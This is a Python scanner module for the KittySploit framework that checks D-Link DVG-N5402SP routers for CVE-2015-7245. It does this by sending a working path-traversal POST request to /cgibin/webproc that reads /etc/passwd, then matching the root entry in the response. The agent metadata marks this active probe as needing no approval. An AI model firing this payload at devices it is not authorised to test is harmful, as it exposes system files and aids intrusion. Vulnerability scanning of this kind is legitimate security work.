#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DVG-N5402SP is susceptible to local file inclusion in products with firmware W1000CN-00, W1000CN-03, or."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DVG-N5402SP - Local File Inclusion Detection',
        'description': 'D-Link DVG-N5402SP is susceptible to local file inclusion in products with firmware W1000CN-00, W1000CN-03, or W2000EN-00. A remote attacker can read sensitive information via a .. (dot dot) in the errorpage parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2015', 'cve', 'dlink', 'lfi', 'packetstorm', 'edb', 'd-link', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/135590/D-Link-DVG-N5402SP-Path-Traversal-Information-Disclosure.html',
            'https://www.exploit-db.com/exploits/39409/',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-7245',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-7245',
    }

    def run(self):
        path = '/cgibin/webproc'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='getpage=html%2Findex.html&*errorpage*=../../../../../../../../../../../etc/passwd&var%3Amenu=setup&var%3Apage=connected&var%&objaction=auth&%3Ausername=blah&%3Apassword=blah&%3Aaction=login&%3Asessionid=abcdefgh\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='D-Link DVG-N5402SP - Local File Inclusion detected', path=path)
            return True
        return False

